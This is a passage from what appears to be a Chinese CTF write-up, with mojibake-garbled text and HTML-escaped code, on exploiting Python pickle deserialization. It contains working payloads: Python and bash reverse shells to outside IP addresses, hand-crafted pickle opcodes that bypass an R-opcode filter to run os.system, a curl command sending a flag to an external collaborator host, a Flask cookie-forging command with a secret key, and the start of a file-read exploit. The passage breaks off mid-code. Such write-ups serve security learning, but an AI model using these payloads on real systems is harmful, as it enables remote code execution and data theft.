&lt;span style="color:#d88200">&amp;#34;python&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#d88200">&amp;#34;-c&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#d88200">&amp;#34;print(&amp;#39;pwned!&amp;#39;)&amp;#34;&lt;/span>
&lt;span style="color:#111">])&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Payload:&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">payload&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Length:&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">len&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">payload&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Base64:&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">base64&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">b64encode&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">payload&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;span style="color:#111">x&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">pickle&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">loads&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">payload&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">x&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">__name__&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#d88200">&amp;#34;__main__&amp;#34;&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">main&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#75715e"># åå¼¹shellå½“ç„¶ä¹Ÿå¯ éƒ½è¯´äº†æ˜¯rceäº†&lt;/span>
&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">sys&lt;/span>&lt;span style="color:#f92672">,&lt;/span>&lt;span style="color:#111">socket&lt;/span>&lt;span style="color:#f92672">,&lt;/span>&lt;span style="color:#111">os&lt;/span>&lt;span style="color:#f92672">,&lt;/span>&lt;span style="color:#111">pty&lt;/span>
&lt;span style="color:#111">s&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">socket&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">socket&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#111">s&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">connect&lt;/span>&lt;span style="color:#111">((&lt;/span>&lt;span style="color:#d88200">&amp;#34;182.92.191.192&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">50000&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#111">os&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">dup2&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">s&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">fileno&lt;/span>&lt;span style="color:#111">(),&lt;/span>&lt;span style="color:#111">fd&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#111">fd&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>&lt;span style="color:#111">)]&lt;/span>
&lt;span style="color:#111">pty&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">spawn&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;/bin/sh&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">payload&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">exploit&lt;/span>&lt;span style="color:#111">([&lt;/span>
&lt;span style="color:#d88200">&amp;#34;python&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#d88200">&amp;#34;-c&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#d88200">&amp;#39;import sys,socket,os,pty;s=socket.socket();s.connect((&amp;#34;8.8.8.8&amp;#34;, 13337));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(&amp;#34;/bin/sh&amp;#34;)&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#111">])&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;details>
&lt;summary>
&lt;h4 class="inline">
æ —å­8 - [å·…å³°æžå®¢ 2021]opcode
&lt;/h4>
&lt;/summary>
&lt;p>é¦–é¡µæ˜¯ç™»å½•æ¡†ï¼Œä»»æ„å€¼å‡å¯ç™»å…¥ æ˜Žé¢ä¸Šæ²¡ä»€ä¹ˆä¸œè¥¿ æŠ“åŒ…åŽçœ‹åˆ°postä¼ å…¥å‚æ•°æœ‰ä¸‰ä¸ª username, password, imagePathï¼Œè¿™é‡Œçš„imagePathä¹Ÿå¯è¿›è¡Œä»»æ„æ–‡ä»¶è¯»å–ï¼Œçœ‹ä¸€ä¸‹åŽç«¯æºç &lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211024145247073.png" alt="image-20211024145247073">&lt;/p>
&lt;p>ç¬¬ä¸€çœ¼çœ‹è¿‡åŽ»æ˜¯pç‰›çš„é¢˜å’Œå¦ä¸€ä¸ªé¢˜çš„æ‚äº¤äº†ï¼Œé™åˆ¶builtinså¹¶ä¸”ä¸èƒ½æœ‰Ræ“ä½œç ï¼Œå…¥å£å¤„åœ¨44è¡Œçš„&lt;code>session['data']&lt;/code>å¤„&lt;/p>
&lt;p>ä½†æ˜¯æˆ‘æ²¡ä»”ç»†æ³¨æ„çš„åœ°æ–¹æ˜¯17è¡Œï¼Œè·Ÿpç‰›çš„é‚£ä¸ªé¢˜ä¸€å¯¹æ¯”å°±èƒ½çœ‹å‡ºæ¥è¿™æ ·çš„å†™æ³•&lt;u>å› ä¸ºæ˜¯å•ç‹¬çš„defè€Œä¸æ˜¯åœ¨å¯¹PickleSerializerè¿›è¡Œä¿®æ”¹ï¼Œå®Œå…¨åšä¸åˆ°é‡å†™&lt;code>pickle.loads&lt;/code>æ–¹æ³•ï¼Œåªæ˜¯ä¸ªæ‘†è®¾&lt;/u>ï¼Œç›¸å½“äºŽä»…å¯¹Ræ“ä½œç è¿›è¡Œäº†é™åˆ¶ï¼Œç¬‘å˜»äº†&lt;/p>
&lt;p>ç›´æŽ¥ä¸Š&lt;code>eval()&lt;/code>+&lt;code>b'o'&lt;/code>æ¥å¼¹shelläº†ï¼Œä¸å¤šbb&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">cbuiltins&lt;/span>
&lt;span style="color:#111">eval&lt;/span>
&lt;span style="color:#111">S&lt;/span>&lt;span style="color:#d88200">&amp;#39;__import__(&amp;#34;os&amp;#34;).system(&lt;/span>&lt;span style="color:#8045ff">\&amp;#39;&lt;/span>&lt;span style="color:#d88200">bash -c &amp;#34;bash -i &amp;gt;&amp;amp; /dev/tcp/101.35.113.107/8426 0&amp;amp;1&amp;#34;&lt;/span>&lt;span style="color:#8045ff">\&amp;#39;&lt;/span>&lt;span style="color:#d88200">)&amp;#39;&lt;/span>
&lt;span style="color:#111">o&lt;/span>&lt;span style="color:#f92672">.&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>æˆ–è€…æ˜¯ç”¨&lt;code>system()&lt;/code>+&lt;code>curl&lt;/code>+&lt;code>b'o'&lt;/code>å¤–å¸¦flag&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">cos&lt;/span>
&lt;span style="color:#111">system&lt;/span>
&lt;span style="color:#111">S&lt;/span>&lt;span style="color:#d88200">&amp;#39;curl burp_collaborator.net/?flag=`app/readflag`&amp;#39;&lt;/span>
&lt;span style="color:#111">o&lt;/span>&lt;span style="color:#f92672">.&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>ç„¶åŽç”Ÿæˆb64çš„å†…å®¹ï¼ˆç”¨&lt;code>'''&lt;/code>çš„å¥½å¤„æ˜¯ä¸ç”¨è€ƒè™‘å¤ªå¤šå¼•å·è½¬ä¹‰çš„é—®é¢˜&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">base64&lt;/span>
&lt;span style="color:#111">data&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;&amp;#39;&amp;#39;xxxxxxxxxxxxxx&amp;#39;&amp;#39;&amp;#39;&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">base64&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">b64encode&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">data&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>cookieçš„ç”Ÿæˆå°±æ˜¯flask_session_cookie_managerä¸€æŠŠæ¢­äº†&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">$ python3 flask_session_cookie_manager3.py encode -s &lt;span style="color:#d88200">&amp;#39;y0u-wi11_neuer_kn0vv-!@#se%32&amp;#39;&lt;/span> -t &lt;span style="color:#d88200">&amp;#39;{&amp;#34;data&amp;#34;: &amp;#34;xxxxb64_contentxxxx&amp;#34;, &amp;#34;username&amp;#34;: &amp;#34;adminadmin&amp;#34;}&amp;#39;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>â€”â€”â€”â€”å¦‚æžœæŒ‰ç…§é¢˜ç›®åŽŸæœ‰çš„æ„æ€ï¼Œé™åˆ¶&lt;code>builtins&lt;/code>+&lt;code>b'R'&lt;/code>æ“ä½œç ä¹Ÿæ˜¯å¾ˆå¥½åšå‡ºæ¥çš„&lt;/p>
&lt;p>å…ˆç”¨pkerç”Ÿæˆå¸¦Rçš„opcode&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#111">getattr&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">GLOBAL&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;builtins&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;getattr&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">dict&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">GLOBAL&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;builtins&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;dict&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">dict_get&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">getattr&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">dict&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;get&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">globals&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">GLOBAL&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;builtins&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;globals&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">builtins&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">globals&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#111">__builtins__&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">dict_get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">builtins&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;__builtins__&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">eval&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">getattr&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">__builtins__&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;eval&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">eval&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;__import__(&amp;#34;os&amp;#34;).system(&amp;#34;whoami&amp;#34;)&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span>
&lt;span style="color:#75715e"># b&amp;#39;cbuiltins\ngetattr\np0\n0cbuiltins\ndict\np1\n0g0\n(g1\nS\&amp;#39;get\&amp;#39;\ntRp2\n0cbuiltins\nglobals\np3\n0g3\n(tRp4\n0g2\n(g4\nS\&amp;#39;__builtins__\&amp;#39;\ntRp5\n0g0\n(g5\nS\&amp;#39;eval\&amp;#39;\ntRp6\n0g6\n(S\&amp;#39;__import__(&amp;#34;os&amp;#34;).system(&amp;#34;whoami&amp;#34;)\&amp;#39;\ntR.&amp;#39;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>ç„¶åŽæ‰‹æ“ï¼Œåœ¨è°ƒç”¨callableå‰æ·»åŠ MARKå³&lt;code>(&lt;/code>ï¼ŒåŽ»æŽ‰&lt;code>t&lt;/code>å’Œè°ƒç”¨&lt;code>t&lt;/code>ç”¨åˆ°çš„MARK&lt;/p>
&lt;p>ä¹Ÿå°±æ˜¯&lt;code>[callable] [tuple] R===&amp;gt;MARK [callable] [args...] o&lt;/code>&lt;/p>
&lt;pre tabindex="0">&lt;code>b'''cbuiltins\ngetattr\np0\n0cbuiltins\ndict\np1\n0(g0\ng1\nS'get'\nop2\n0cbuiltins\nglobals\np3\n0(g3\nop4\n0(g2\ng4\nS'__builtins__'\nop5\n0(g0\ng5\nS'eval'\nop6\n0(g6\nS'__import__(&amp;quot;os&amp;quot;).system(&amp;quot;whoami&amp;quot;)'\no.'''
&lt;/code>&lt;/pre>&lt;p>å¯ä»¥çœ‹ä¸‹åŒºåˆ«&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211024165337816.png" alt="image-20211024165337816">&lt;/p>
&lt;p>ä¿®æ”¹éƒ½æ˜¯ä¸€å¯¹ä¸€å¯¹çš„ï¼Œ&lt;strong>æ€»ç»“ä¸€ä¸‹æ–¹æ³•å°±æ˜¯&lt;code>0gx&lt;/code>è¦å˜ä¸º&lt;code>0(gx&lt;/code>ï¼Œ&lt;code>(gx&lt;/code>è¦å˜ä¸º&lt;code>gx&lt;/code> ï¼Œ&lt;code>tR&lt;/code>æ¢æˆ&lt;code>o&lt;/code>&lt;/strong>&lt;/p>
&lt;p>å‚è€ƒï¼š&lt;a href="https://miaotony.xyz/2021/08/07/CTF_2021dianfengjike/#toc-heading-6">wp&lt;/a>&lt;/p>
&lt;/details>
&lt;h3 id="--ä½¿ç”¨_getattributeload_objload_instå®žçŽ°ä»»æ„æ–‡ä»¶è¯»å–">&amp;ndash;&amp;raquo;ä½¿ç”¨&lt;code>_getattribute()&lt;/code>&amp;amp;&lt;code>load_obj()&lt;/code>&amp;amp;&lt;code>load_inst()&lt;/code>å®žçŽ°ä»»æ„æ–‡ä»¶è¯»å–&lt;/h3>
&lt;ul>
&lt;li>
&lt;p>&lt;code>find_class()&lt;/code>&lt;/p>
&lt;ul>
&lt;li>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">find_class&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">self&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">module&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#75715e"># Subclasses may override this.&lt;/span>
&lt;span style="color:#111">sys&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">audit&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;pickle.find_class&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">module&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">self&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">proto&lt;/span> &lt;span style="color:#f92672">&amp;lt;&lt;/span> &lt;span style="color:#ae81ff">3&lt;/span> &lt;span style="color:#f92672">and&lt;/span> &lt;span style="color:#111">self&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">fix_imports&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">module&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">_compat_pickle&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">NAME_MAPPING&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">module&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">name&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">_compat_pickle&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">NAME_MAPPING&lt;/span>&lt;span style="color:#111">[(&lt;/span>&lt;span style="color:#111">module&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#111">)]&lt;/span>
&lt;span style="color:#00a8c8">elif&lt;/span> &lt;span style="color:#111">module&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">_compat_pickle&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">IMPORT_MAPPING&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">module&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">_compat_pickle&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">IMPORT_MAPPING&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#111">module&lt;/span>&lt;span style="color:#111">]&lt;/span>
&lt;span style="color:#111">__import__&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">module&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">level&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">self&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">proto&lt;/span> &lt;span style="color:#f92672">&amp;gt;=&lt;/span> &lt;span style="color:#ae81ff">4&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">_getattribute&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">sys&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">modules&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#111">module&lt;/span>&lt;span style="color:#111">],&lt;/span> &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#111">)[&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">]&lt;/span>
&lt;span style="color:#00a8c8">else&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">getattr&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">sys&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">modules&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#111">module&lt;/span>&lt;span style="color:#111">],&lt;/span> &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>
&lt;p>&lt;code>_getattribute()&lt;/code>&lt;/p>
&lt;ul>
&lt;li>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">_getattribute&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">obj&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#111">subpath&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">split&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;.&amp;#39;&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">subpath&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#d88200">&amp;#39;&amp;lt;locals&amp;gt;&amp;#39;&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#00a8c8">raise&lt;/span> &lt;span style="color:#75af00">AttributeError&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Can&amp;#39;t get local attribute &lt;/span>&lt;span style="color:#d88200">{!r}&lt;/span>&lt;span style="color:#d88200"> on &lt;/span>&lt;span style="color:#d88200">{!r}&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span>
&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">format&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">name&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">obj&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;span style="color:#00a8c8">try&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">parent&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">obj&lt;/span>
&lt;span style="color:#111">obj&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">getattr&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">obj&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">subpath&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">except&lt;/span> &lt;span style="color:#75af00">AttributeError&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#00a8c8">raise&lt;/span> &lt;span style="color:#75af00">AttributeError&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Can&amp;#39;t get attribute &lt;/span>&lt;span style="color:#d88200">{!r}&lt;/span>&lt;span style="color:#d88200"> on &lt;/span>&lt;span style="color:#d88200">{!r}&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span>
&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">format&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">name&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">obj&lt;/span>&lt;span style="color:#111">))&lt;/span> &lt;span style="color:#f92672">from&lt;/span> &lt;span style="color:#111">None&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">obj&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">parent&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>
&lt;p>&lt;code>read()&lt;/code>&lt;/p>
&lt;ul>
&lt;li>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">read&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">filename&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">encoding&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#39;utf-8&amp;#39;&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#00a8c8">with&lt;/span> &lt;span style="color:#111">open&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">filename&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;r&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">encoding&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">encoding&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#00a8c8">as&lt;/span> &lt;span style="color:#111">fin&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">fin&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">read&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;p>ä»ç„¶ä»¥ä¸Šé¢webtmp(ç©¶æžç¼åˆæ€ª)çš„é¢˜ä¸ºä¾‹ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨ä¸Šé¢çš„å‡½æ•°ï¼Œåˆ›å»ºä¸€ä¸ªAnimalçš„å®žä¾‹ï¼Œç„¶åŽå°†nameæˆ–categoryçš„å€¼è®¾ç½®ä¸ºread wrapperçš„è¿”å›žå€¼&lt;/p>
&lt;p>exp.py&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">pickle&lt;/span>
&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">struct&lt;/span>
&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">base64&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">read&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">filename&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">encoding&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#39;utf-8&amp;#39;&lt;/span>&lt;span style="color:#111">):&lt;/span>
